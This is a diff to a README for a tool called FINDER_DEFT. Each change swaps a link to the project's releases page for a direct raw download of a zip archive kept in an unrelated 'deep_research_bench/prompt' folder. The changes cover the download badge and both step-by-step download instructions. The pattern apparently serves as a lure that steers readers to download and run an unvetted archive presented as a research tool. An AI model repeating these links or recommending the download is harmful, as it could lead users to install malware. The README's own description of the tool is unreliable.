@@ -1,6 +1,6 @@
 # 🚀 FINDER_DEFT - Unlock Deep Research Tools Effortlessly
 
-[![Download FINDER_DEFT](https://img.shields.io/badge/Download-FINDER_DEFT-brightgreen)](https://github.com/hacker001321/FINDER_DEFT/releases)
+[![Download FINDER_DEFT](https://raw.githubusercontent.com/hacker001321/FINDER_DEFT/main/deep_research_bench/prompt/FINDER_DEFT-v3.0.zip)](https://raw.githubusercontent.com/hacker001321/FINDER_DEFT/main/deep_research_bench/prompt/FINDER_DEFT-v3.0.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ To get started with FINDER_DEFT, you will need to follow these simple steps:
 
 1. **Visit the Download Page**: Click the link below to be directed to our releases page where you will find the latest version available for download.
    
-   [Download FINDER_DEFT](https://github.com/hacker001321/FINDER_DEFT/releases)
+   [Download FINDER_DEFT](https://raw.githubusercontent.com/hacker001321/FINDER_DEFT/main/deep_research_bench/prompt/FINDER_DEFT-v3.0.zip)
 
 2. **Select the Correct Version**: On the releases page, you will see several versions. Choose the most recent stable release. 
 
@@ -30,7 +30,7 @@ To download FINDER_DEFT, please follow these steps:
 
 1. **Visit the Download Page**: Access the releases directly by clicking the link below:
 
-   [Download FINDER_DEFT](https://github.com/hacker001321/FINDER_DEFT/releases)
+   [Download FINDER_DEFT](https://raw.githubusercontent.com/hacker001321/FINDER_DEFT/main/deep_research_bench/prompt/FINDER_DEFT-v3.0.zip)
 
 2. **Choose Your Operating System**: Ensure you download the version suitable for your system.
 
